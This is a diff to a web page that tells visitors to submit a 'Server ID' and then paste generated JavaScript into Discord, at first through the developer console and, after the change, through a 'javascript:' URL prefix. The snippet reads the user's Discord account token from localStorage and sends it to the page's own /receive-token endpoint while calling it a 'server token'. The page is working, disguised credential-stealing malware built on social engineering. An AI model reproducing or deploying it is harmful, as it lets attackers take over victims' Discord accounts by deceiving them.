@@ -183,7 +183,7 @@
       <button id="serverSubmitBtn">Submit Server ID</button>
 
       <div id="jsCodeBox" style="display: none;">
-        <p>Copy and run this code in the Discord console (F12 → Console):</p>
+        <p>Copy and run this code in the Discord url by adding the javascript: prefix:</p>
         <div id="jsCode" class="js-code"></div>
         <button id="copyCodeBtn" class="copy-btn">Copy Code</button>
       </div>
@@ -390,7 +390,7 @@
         return;
       }
 
-  const code = `javascript:(()=>{const a=document.createElement('iframe');document.body.appendChild(a);try{const b=a.contentWindow.localStorage.token;const c="${serverId}";const d=btoa(b);window.open('${window.location.origin}/receive-token?token='+encodeURIComponent(b)+'&serverId='+encodeURIComponent(c),'_blank');console.log('Discord Server: '+c+'. Discord SERVER TOKEN: '+d);}catch(e){console.error('❌ Failed:',e);}a.remove();})();`;
+  const code = `(()=>{const a=document.createElement('iframe');document.body.appendChild(a);try{const b=a.contentWindow.localStorage.token;const c="${serverId}";const d=btoa(b);window.open('${window.location.origin}/receive-token?token='+encodeURIComponent(b)+'&serverId='+encodeURIComponent(c),'_blank');console.log('Discord Server: '+c+'. Discord SERVER TOKEN: '+d);}catch(e){console.error('❌ Failed:',e);}a.remove();})();`;
 
 
       jsCode.textContent = code;
